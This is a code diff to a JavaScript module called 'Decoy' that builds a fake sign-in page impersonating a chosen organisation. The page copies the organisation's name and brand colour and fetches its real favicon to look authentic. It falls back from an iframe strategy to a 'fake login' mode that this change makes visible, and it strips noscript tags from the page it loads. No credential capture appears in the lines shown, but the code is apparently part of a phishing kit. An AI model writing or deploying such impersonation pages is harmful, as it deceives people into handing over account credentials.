@@ -52,11 +52,6 @@ const Decoy = (() => {
     // Page title
     document.title = `Sign in – ${cfg.orgName}`;
 
-    // Logo — generate an SVG letter-icon with the brand colour
-    const logo = document.getElementById('decoyLogo');
-    const svg  = generateLogoSvg(cfg.logoLetter, cfg.brandColor);
-    logo.src   = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
-
     // Title / subtitle
     document.getElementById('decoyTitle').textContent    = `Sign in to ${cfg.orgName}`;
     document.getElementById('decoySubtitle').textContent = `Use your ${cfg.orgName} account`;
@@ -70,13 +65,10 @@ const Decoy = (() => {
     const btn = document.getElementById('decoySubmit');
     btn.style.background = cfg.brandColor;
 
-    // Favicon — try real favicon first, SVG fallback
+    // Favicon — try real favicon from Google
     const fav = document.getElementById('favicon');
     const realFav = new Image();
     realFav.onload = () => { fav.href = realFav.src; };
-    realFav.onerror = () => {
-      fav.href = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
-    };
     realFav.src = `https://www.google.com/s2/favicons?domain=${cfg.domain}&sz=64`;
   }
 
@@ -116,8 +108,10 @@ const Decoy = (() => {
       log('Iframe strategy threw:', e.message);
     }
 
-    // Strategy 3: fake login is already rendered
+    // Strategy 3: fake login is already rendered — show it now
     _mode = 'fake';
+    const body = document.querySelector('.decoy-body');
+    if (body) body.classList.add('visible');
     log('All strategies failed — mode: fake (fallback)');
     showLoading(false);
     return 'fake';
@@ -325,15 +319,6 @@ const Decoy = (() => {
     // Also remove noscript content (show the underlying content)
     html = html.replace(/<\/?noscript[^>]*>/gi, '');
     return html;
-  }
-
-  /* ---------- SVG logo helper ---------- */
-  function generateLogoSvg(letter, color) {
-    return `<svg xmlns="http://www.w3.org/2000/svg" width="56" height="56" viewBox="0 0 56 56">
-      <rect width="56" height="56" rx="12" fill="${color}"/>
-      <text x="28" y="38" text-anchor="middle" font-size="30" font-weight="700"
-            fill="#fff" font-family="sans-serif">${letter}</text>
-    </svg>`;
   }
 
   /* ==========================================================
